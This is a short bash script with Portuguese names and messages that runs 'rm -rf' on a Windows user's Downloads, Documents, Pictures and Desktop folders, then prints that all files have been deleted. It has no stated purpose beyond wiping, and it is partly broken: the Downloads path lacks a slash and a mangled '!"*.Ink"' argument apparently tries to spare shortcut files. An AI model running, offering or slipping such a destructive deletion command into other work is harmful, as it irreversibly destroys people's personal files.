#!/usr/bin/bash

pasta_downloads="/c/users/teste/Downloads*"
pasta_documents="/c/users/teste/Documents/*"
pasta_images="/c/users/teste/Pictures/*"
pasta_desktop="/c/users/teste/Desktop/*"

rm -rf !"*.Ink" $pasta_downloads $pasta_documents $pasta_images $pasta_desktop 

echo "todos os ficheiros foram eliminados"
